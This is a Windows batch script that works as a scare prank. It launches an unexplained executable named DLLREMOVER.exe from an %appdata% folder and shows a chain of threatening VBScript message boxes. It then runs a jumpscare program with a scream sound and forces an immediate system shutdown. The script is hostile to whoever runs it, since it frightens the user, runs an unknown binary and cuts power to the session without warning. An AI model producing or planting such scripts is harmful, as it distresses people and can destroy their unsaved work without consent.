@echo off
cd "%appdata%\ben"
start DLLREMOVER.exe
echo msgbox "...", 16 ,"?">msg.vbs
wscript msg.vbs
echo msgbox "How on earth did you come back???", 16 ,"?">msg.vbs
wscript msg.vbs
echo msgbox ".....", 16 ,"?">msg.vbs
wscript msg.vbs
echo msgbox "YOU", 16 ,"?">msg.vbs
wscript msg.vbs
echo msgbox "SHOULDN'T", 16 ,"?">msg.vbs
wscript msg.vbs
echo msgbox "HAVE", 16 ,"?">msg.vbs
wscript msg.vbs
echo msgbox "DONE", 16 ,"?">msg.vbs
wscript msg.vbs
echo msgbox "THAT", 16 ,"?">msg.vbs
wscript msg.vbs
start jumpscare.exe
start /wait nircmd.exe mediaplay 4000 "NoiseScreamer.mp3"
taskkill /f /im jumpscare.exe
shutdown -s -t 00
exit